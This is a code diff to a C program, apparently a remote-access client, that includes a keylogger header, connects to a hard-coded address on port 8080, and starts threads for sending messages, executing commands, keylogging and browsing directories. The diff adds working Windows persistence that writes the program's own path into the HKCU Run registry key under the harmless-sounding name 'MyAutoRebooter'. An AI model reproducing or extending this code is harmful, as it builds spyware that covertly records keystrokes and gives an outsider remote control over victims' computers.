@@ -16,6 +16,34 @@
 #include "SURF/seeDirectory.h"
 #include "keylogger.h"
 
+#ifdef _WIN32
+void add_to_startup(const char *exe_path) {
+    HKEY hKey;
+    LONG result = RegOpenKeyExA(
+        HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0,
+        KEY_WRITE,
+        &hKey
+    );
+
+    if (result == ERROR_SUCCESS) {
+        RegSetValueExA(
+            hKey,
+            "MyAutoRebooter", // Nama program di startup
+            0,
+            REG_SZ,
+            (const BYTE *)exe_path,
+            (DWORD)(strlen(exe_path) + 1)
+        );
+        RegCloseKey(hKey);
+        printf("Program berhasil ditambahkan ke Startup.\n");
+    } else {
+        printf("Gagal menambahkan ke Startup.\n");
+    }
+}
+#endif
+
 #define PORT 8080
 #define ADDRESS "192.168.0.105"
 int main() {
@@ -34,6 +62,11 @@ int main() {
 
 
 #ifdef _WIN32
+	char path[MAX_PATH];
+	GetModuleFileNameA(NULL, path, MAX_PATH);
+
+	// Tambahkan program ke registry agar jalan otomatis saat startup
+	add_to_startup(path);
 	HANDLE cliSocket, sendMSG, execMSG, actKeylog, surf;
 	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId, surfId;
 
